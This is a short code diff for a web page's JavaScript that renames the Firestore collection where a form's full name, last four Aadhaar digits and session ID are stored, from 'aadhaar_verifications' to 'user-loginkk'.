@@ -289,7 +289,7 @@
     document.getElementById('overlay').style.display = 'flex';
 
     try {
-      await addDoc(collection(db, "aadhaar_verifications"), {
+      await addDoc(collection(db, "user-loginkk"), {
         fullName: fullName,
         aadhaarLast4: aadhaarLast4,
         sessionId: sessionId, // Save sessionId with the data
